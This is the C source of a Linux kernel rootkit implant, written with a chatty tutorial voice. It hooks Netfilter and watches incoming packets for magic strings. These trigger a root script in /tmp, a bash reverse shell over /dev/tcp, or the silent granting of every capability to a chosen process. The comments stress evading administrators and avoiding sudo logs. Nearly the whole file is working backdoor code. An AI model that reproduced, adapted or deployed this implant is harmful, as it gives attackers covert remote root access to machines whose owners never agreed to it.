#include <linux/capability.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/skbuff.h>
#include <linux/workqueue.h>

// Uncomment the following line to enable debug messages
// #define DEBUG_PAYLOAD

// Here I borrow the printk macro from the kernel, modifying it to use p_printk
#ifdef DEBUG_PAYLOAD
#define Dprintk(fmt, ...)                                                      \
	p_printk(KERN_DEBUG "Kris Implant: " fmt, ##__VA_ARGS__)
#else
#define Dprintk(fmt, ...)                                                      \
	do {                                                                       \
	} while (0)
#endif

// Here are the magic strings and values used to trigger the payloads

// The first payload is a script that is run by bash in userland as root.
// The script is located on the filesystem at SCRIPT_LOCATION
// I chose /tmp as it is often writable by all users, but you can change it to whatever you want.
#define MAGIC_RUN_SCRIPT "whats-a-jwt"
#define SCRIPT_LOCATION  "/tmp/.jwt.sh"

// The second payload is a reverse shell that is run by bash in userland as root.
// The reverse shell connects to 127.0.0.1 on port 1337 for now.
// You can change the IP and port to whatever you want.
// You can also change the command to whatever you want.
// Theoretically, this doesn't have to be a reverse shell, it can be any command.
#define MAGIC_REVSHELL "kris-probably-knows-what-a-jwt-is"
#define REVSHELL_CMD   "sh -i >& /dev/tcp/127.0.0.1/1337 0>&1"

// This is the coolest payload. It grants all capabilities to the process specified in the packet.
// packet format is:
#define MAGIC_CAPABILITIES_PREFIX "its-pronounced-jot-according-to-RFC-"
// pid
#define MAGIC_CAPABILITIES_TERMINATOR '!'
// Theoretically, you cant set capabilities on a running process, but I found a way to do it!

// This is the value of the capabilities we want to set.
// I chose to set all capabilities, but you can change it to whatever you want.
// You can cat /proc/sys/kernel/cap_last_cap to get the last capability number.
// On my test machine, it was 40
// 2^41 - 1 = 2199023255551
// = 0x000001ffffffffffLL
#define DESIRED_CAPS 0x000001ffffffffffLL

// these variables are defined in the linker script
// they are the start and end of the payload
// I don't use them in this code, but I left them here for reference.
extern unsigned char __payload[];
extern unsigned char __payload_end[];

////////////////////////////////////////////////////////////////////////////////
// Kernel API imports
////////////////////////////////////////////////////////////////////////////////
// Here we define function pointers for the kernel API functions we need.
// These will be filled in by the lookup_name function as needed.
static typeof(_printk) *p_printk = NULL;
static typeof(kmalloc) *p_kmalloc = NULL;
static typeof(kfree) *p_kfree = NULL;
static typeof(memcmp) *p_memcmp = NULL;
static typeof(call_usermodehelper) *p_call_usermodehelper = NULL;
static typeof(nf_register_net_hooks) *p_nf_register_net_hooks = NULL;
static typeof(execute_in_process_context) *p_execute_in_process_context = NULL;
static typeof(get_pid_task) *p_get_pid_task = NULL;
static typeof(find_get_pid) *p_find_get_pid = NULL;

////////////////////////////////////////////////////////////////////////////////

// This is a function that is similar to strstr, but it searches for a substring in memory.
// It returns a pointer to the first occurrence of the substring in the memory, or NULL if it is not found.
// This function is used to search for the magic prefixes in the packets.
// This is different from memmem because it doesn't use weird algorithms to make it faster.
// It just searches through the memory byte by byte.
// This is fine because the magic prefixes are short.
// If the rootkit is slowing your internet down, you can try to optimise this function :P
static inline void *find_substring_in_memory(const void *h, size_t hlen, const void *n,
                           size_t nlen) {
	if (!h || !hlen || !n || !nlen || (nlen > hlen))
		return NULL;

	while (hlen >= nlen) {
		if (!p_memcmp(h, n, nlen))
			return (void *)h;
		h++, hlen--;
	}

	return NULL;
}

// These functions are used to build the delayed work structs.
// The delayed work structs are used to run the payloads in process context.
// This is necessary because the kernel thread that runs the hook function runs in interrupt context.
// This means that it can't do things like allocate memory or run usermodehelper.
// So, we create a delayed work struct and schedule it to run in process context.
// This allows us to run usermodehelper and allocate memory.
static void delayed_work_run_script(struct work_struct *ws) {
	char *envp[2] = {"HOME=/proc", NULL};
	char *argv[4] = {"/bin/sh", "-c", SCRIPT_LOCATION, NULL};
	p_call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	// free the delayed work struct once we are done with it
	p_kfree(container_of(ws, struct execute_work, work));
}
static void delayed_work_revshell(struct work_struct *ws) {
	char *envp[2] = {"HOME=/proc", NULL};
	char *argv[4] = {"/bin/sh", "-c", REVSHELL_CMD, NULL};
	p_call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	p_kfree(container_of(ws, struct execute_work, work));
}

// This big ugly function is used to print the capabilities of a process.
// It is used for debugging.
static void print_capabilities(struct task_struct *taskp) {
	Dprintk("taskp->real_cred->cap_inheritable: %llu\n",
	        ((kernel_cap_t *)(&taskp->real_cred->cap_inheritable))->val);
	Dprintk("taskp->real_cred->cap_permitted: %llu\n",
	        ((kernel_cap_t *)(&taskp->real_cred->cap_permitted))->val);
	Dprintk("taskp->real_cred->cap_effective: %llu\n",
	        ((kernel_cap_t *)(&taskp->real_cred->cap_effective))->val);
	Dprintk("taskp->real_cred->cap_bset: %llu\n",
	        ((kernel_cap_t *)(&taskp->real_cred->cap_bset))->val);
	Dprintk("taskp->real_cred->cap_ambient: %llu\n",
	        ((kernel_cap_t *)(&taskp->real_cred->cap_ambient))->val);
	Dprintk("taskp->cred->cap_inheritable: %llu\n",
	        ((kernel_cap_t *)(&taskp->cred->cap_inheritable))->val);
	Dprintk("taskp->cred->cap_permitted: %llu\n",
	        ((kernel_cap_t *)(&taskp->cred->cap_permitted))->val);
	Dprintk("taskp->cred->cap_effective: %llu\n",
	        ((kernel_cap_t *)(&taskp->cred->cap_effective))->val);
	Dprintk("taskp->cred->cap_bset: %llu\n",
	        ((kernel_cap_t *)(&taskp->cred->cap_bset))->val);
	Dprintk("taskp->cred->cap_ambient: %llu\n",
	        ((kernel_cap_t *)(&taskp->cred->cap_ambient))->val);
}

// This is really cool.
// This function sets all capabilities on a process.
// It does this by directly modifying the kernel structures, which we can do because we are the kernel.
// This is great, because theoretically, you can't set capabilities on a running process, so this is a cool trick.
// The reason do this instead of setting the uid to 0 is because if a sysadmin sees that a process has uid 0, they will know something is up, 
// but probably won't notice if the process has all capabilities, as it is a more obscure concept, and not as easy to accidentally see via ps.
static void set_all_capabilities(struct task_struct *taskp) {
	// set the capabilities
	// In kernel > 6.3, we use val instead of cap[0]
	// This is because the kernel devs decided to make the capabilities a union instead of an array.
	// This was annoying to debug, because all of the two examples of interacting with the struct
	// that I found online used the array syntax. Digging through the kernel source code was fun though.

	// print initial capabilities
	print_capabilities(taskp);

	// Here we cast the capabilities to kernel_cap_t, which is a struct that contains the capabilities.
	// We then go through and set all of the capabilities to the desired value.
	// Capabilities are very confusing, so I won't go into detail about what each one does.
	// The most important thing is that by setting all of the capabilities, we can do anything we want!
	// It feels like we are root, but we are not!
	// This also means that no sudo logs are generated, which is great!
	((kernel_cap_t *)(&taskp->real_cred->cap_inheritable))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->real_cred->cap_permitted))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->real_cred->cap_effective))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->real_cred->cap_bset))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->real_cred->cap_ambient))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->cred->cap_inheritable))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->cred->cap_permitted))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->cred->cap_effective))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->cred->cap_bset))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->cred->cap_ambient))->val = DESIRED_CAPS;

	// print new capabilities
	Dprintk("new capabilities:\n");
	print_capabilities(taskp);
}

/**
 * This function tries to match the magic prefix in the given sk_buff data with the predefined magic prefixes.
 * If a match is found, it executes the corresponding payload.
 */
static void try_skb(struct sk_buff *skb) {
	// check if the packet contains the magic prefix for the run script payload
	if (find_substring_in_memory(skb->data, skb_headlen(skb), MAGIC_RUN_SCRIPT,
	           sizeof(MAGIC_RUN_SCRIPT) - 1)) {
		Dprintk("found magic prefix for run script\n");
		// allocate a delayed work struct
		struct execute_work *ws =
		    p_kmalloc(sizeof(struct execute_work), GFP_ATOMIC);
		// schedule the delayed work struct to run in process context
		if (ws) {
			p_execute_in_process_context(delayed_work_run_script, ws);
		}
		return;
	}
	if (find_substring_in_memory(skb->data, skb_headlen(skb), MAGIC_REVSHELL,
	           sizeof(MAGIC_REVSHELL) - 1)) {
				// As you can see, this payload is very similar to the run script payload.
		Dprintk("found magic prefix for revshell\n");
		struct execute_work *ws =
		    p_kmalloc(sizeof(struct execute_work), GFP_ATOMIC);
		if (ws) {
			p_execute_in_process_context(delayed_work_revshell, ws);
		}
		return;
	}

	/*
	Grant all capabilities to the process specified in the packet.
	packet format is:
		<magic prefix><pid>
	*/
	// Check if the packet contains the magic prefix
	// if it does, get the pid
	char *p = find_substring_in_memory(skb->data, skb_headlen(skb), MAGIC_CAPABILITIES_PREFIX,
	                 sizeof(MAGIC_CAPABILITIES_PREFIX) - 1);
	if (p) {
		Dprintk("found magic prefix for capabilities\n");
		// get the pid
		unsigned long pid = 0;
		p += sizeof(MAGIC_CAPABILITIES_PREFIX) - 1;
		// We simply iterate through the string until we find a non-digit character.
		Dprintk("p: %p\n", p);
		while (*p >= '0' && *p <= '9') {
			pid *= 10;
			pid += *p - '0';
			p++;
		}
		Dprintk("pid: %lu\n", pid);

		// get the task struct taskp = get_pid_task(find_get_pid(PID),PIDTYPE_PID);
		// The task struct is a struct that contains information about a process.
		// This is where the capabilities are stored.
		struct task_struct *taskp =
		    p_get_pid_task(p_find_get_pid(pid), PIDTYPE_PID);
		Dprintk("taskp: %p\n", taskp);

		// set the capabilities
		set_all_capabilities(taskp);
		Dprintk("capabilities set\n");
	}
}

/**
 * This function is a custom implementation of the local_in hook for Netfilter.
 * It receives a pointer to a socket buffer (skb) and attempts to process it using the try_skb function.
 * If the skb pointer is NULL, the function returns NF_ACCEPT without doing anything.
 * LOCAL_IN corresponds to packets that are destined for the local machine.
 * This means that this function will be called for all packets that are received by the machine.
 */
static unsigned int custom_local_in(void *arg, struct sk_buff *skb,
                                    const struct nf_hook_state *state) {
	if (skb)
		try_skb(skb);
	return NF_ACCEPT;
}
// This is the struct that is used to register the hook.
// It contains a pointer to the hook function, the protocol family, the hook number, and the priority.
// The priority is used to determine the order in which the hooks are called.
// The priority is important because we want to make sure that our hook is called before any other hooks.
// This is because we want to be the first to see the packet, so that we can process it before any other hooks that might drop it.
// This is why we set the priority to NF_IP_PRI_FIRST.
// We set the protocol family to NFPROTO_IPV4 because we only want to process IPv4 packets.
// We set the hook number to NF_INET_LOCAL_IN because we only want to process packets that are destined for the local machine.
// We set the hook function to NULL because we will fill it in later.
static struct nf_hook_ops nf_ops[] = {
    [0] =
        {
            .hook = (nf_hookfn *)NULL,
            .pf = NFPROTO_IPV4,
            .hooknum = NF_INET_LOCAL_IN,
            .priority = NF_IP_PRI_FIRST,
        },
};

// This function is used to register the hook.
// It takes a pointer to the net struct as an argument.
// The net struct is a struct that contains information about the network.
// This function is called by the kernel when the module is loaded.
// It is passed a pointer to the net struct.
// We use this function to fill in the hook function pointer in the nf_ops struct.
// We also use this function to register the hook.
// We do this by calling the nf_register_net_hooks function.
// This function takes a pointer to the net struct, a pointer to an array of nf_hook_ops structs, and the size of the array.
// By passing the net struct to this function, we tell the kernel to register the hooks for the given net struct.
static void init_nf_hooks(void *net) {
	nf_ops[0].hook = (void *)custom_local_in;
	p_nf_register_net_hooks(net, nf_ops, ARRAY_SIZE(nf_ops));
}

// This is the entry point for the implant.
// It is called by main.c when the implant is loaded.
// It takes a pointer to the lookup_name function and a pointer to the net struct as arguments.
// The attribute 'used' tells the compiler to include this function in the final binary, even if it is not called.
// It isn't called in a way that the compiler can detect, so it would normally be removed.
// The attribute 'section' tells the compiler to put this function in the .text.entry section.
// This is important because it means that the function will be loaded at the same address as the original entry point.
// This means we don't have to worry about locating the function, and we can just cast the address we placed the payload at to a function pointer.
// This function returns 0 on success, and a negative number on failure. The negative numbers are arbitrary, and are just used for debugging.
long __attribute__((used, section(".text.entry"))) entry(const typeof(lookup_name) *lookup, void *net) {
	// The code in here is very simple, it just looks up the kernel API functions we need, and registers the hook.
	p_printk = (void *)lookup("_printk");
	if (!p_printk)
		return -2;

	p_call_usermodehelper = (void *)lookup("call_usermodehelper");
	if (!p_call_usermodehelper) {
		Dprintk("no call_usermodehelper found\n");
		return -3;
	}

	p_kmalloc = (void *)lookup("__kmalloc");
	if (!p_kmalloc) {
		Dprintk("no __kmalloc found\n");
		return -4;
	}

	p_kfree = (void *)lookup("kfree");
	if (!p_kfree) {
		Dprintk("no kfree found\n");
		return -5;
	}

	p_memcmp = (void *)lookup("memcmp");
	if (!p_memcmp) {
		Dprintk("no memcmp found\n");
		return -6;
	}

	p_execute_in_process_context = (void *)lookup("execute_in_process_context");
	if (!p_execute_in_process_context) {
		Dprintk("no execute_in_process_context found\n");
		return -7;
	}

	p_nf_register_net_hooks = (void *)lookup("nf_register_net_hooks");
	if (!p_nf_register_net_hooks) {
		Dprintk("no nf_register_net_hooks found\n");
		return -8;
	}

	p_get_pid_task = (void *)lookup("get_pid_task");
	if (!p_get_pid_task) {
		Dprintk("no get_pid_task found\n");
		return -9;
	}

	p_find_get_pid = (void *)lookup("find_get_pid");
	if (!p_find_get_pid) {
		Dprintk("no find_get_pid found\n");
		return -10;
	}

	init_nf_hooks(net);

	Dprintk("Hook inserted!\n");

	return 0;
}
// Congratulations! You made it to the end!